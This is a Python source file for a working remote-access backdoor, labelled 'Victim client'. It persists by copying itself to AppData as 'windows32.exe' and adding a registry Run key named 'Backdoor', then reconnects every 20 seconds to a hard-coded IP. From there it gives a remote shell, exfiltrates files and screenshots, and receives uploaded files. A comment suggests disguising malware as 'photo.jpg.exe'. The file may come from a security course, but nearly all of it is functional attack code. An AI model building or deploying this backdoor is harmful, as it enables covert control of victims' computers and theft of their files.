# Victim client
# Keeps trying to establish a connection with the server
# TCP bi-directional data transfer (infiltration and exfiltation)

import socket
import subprocess
import os
import time
import ctypes
import sys
import shutil
from PIL import ImageGrab
import tempfile
import hashlib

from common import sendFile
from common import HiddenPrints
from common import receiveFile

# Fails to import on Linux
try:
    import winreg as wrg
except ImportError:
    pass

ip = "172.25.191.60"
from common import port
from common import chunksize
from common import hashAlgorithm

# https://www.geeksforgeeks.org/python/manipulating-windows-registry-using-winreg-in-python/
def setAutostart():
    # Copy executable and set Windows registry autorun value
    if os.name == "nt":
        appdataDir = os.environ['appdata']
        executablePath = os.path.join(appdataDir, "windows32.exe")
        if not os.path.exists(executablePath):
            shutil.copyfile(sys.executable, executablePath)

            with wrg.OpenKey(wrg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, wrg.KEY_SET_VALUE) \
            as key:
                wrg.SetValueEx(key, "Backdoor", 0, wrg.REG_SZ, '"' + executablePath + '"')

# https://borutzki.github.io/2025/10/16/how-to-check-whether-python-script-has-elevated-privileges.html
def isAdmin() -> bool:
    if os.name == "nt":
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif os.name == "posix":
        return os.getuid() == 0
    else:
        return False

def shell(mySocket):
    while True:
        command = mySocket.recv(chunksize).decode()
        commandList = command.split()

        if 'terminate' == commandList[0] or 'exit' == commandList[0]:
            break

        elif 'checkUserLevel' == commandList[0]:
            try:
                if isAdmin():
                    informToServer = '[!] Administrator Privileges'
                else:
                    informToServer = '[!!] User Privileges. (No Admin privileges)'
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        # Command format: grab <remote filepath>
        # Example: grab C:\Users\user\Desktop\photo.jpeg
        elif 'grab' == commandList[0]:
            path = " ".join(commandList[1:])
            try:
                with HiddenPrints():
                    sendFile(mySocket, path)
            except FileNotFoundError:
                mySocket.send('File not found'.encode())
            except Exception as e:
                mySocket.send('ERROR'.encode())
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        elif 'screencap' == commandList[0]:
            try:
                tempPath = tempfile.mkdtemp()
                fileName = 'img.jpg'
                fullPath = os.path.join(tempPath, fileName)

                ImageGrab.grab().save(fullPath, "JPEG")
                with HiddenPrints():
                    sendFile(mySocket, fullPath)
                shutil.rmtree(tempPath)
            except Exception as e:
                mySocket.send('ERROR'.encode())
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        # Command format: send <local filepath> <remote filepath>
        # Example: send /home/user/Desktop/malware.exe C:\Users\John\Desktop\photo.jpg.exe
        elif 'send' == commandList[0]:
            try:
                destinationFile = commandList[2]
                with HiddenPrints():
                    receiveFile(mySocket, destinationFile)
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        #command format: "cd<space><Path name>"
        #split using the space between 'cd' and path name
        #(because, path name also may have spaces, that confuses the script)
        #and explicitly tell the operating system to change the directory
        elif 'cd' == commandList[0]:
            try:
                directory = ' '.join(commandList[1:])

                os.chdir(directory)
                informToServer = "[+] Current working directory is " + os.getcwd()
                mySocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occured. " + str(e)
                mySocket.send(informToServer.encode())

        else:
            CMD = subprocess.Popen(command, shell=True, stdin = subprocess.PIPE,
                                  stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())

def connect():
    setAutostart()
    # Trying to connect to server every 20 seconds
    while True:
        try:
            with socket.socket() as mySocket:
                mySocket.connect((ip, port))
                shell(mySocket)
        except:
            pass
        time.sleep(20)

def main():
    connect()

main()
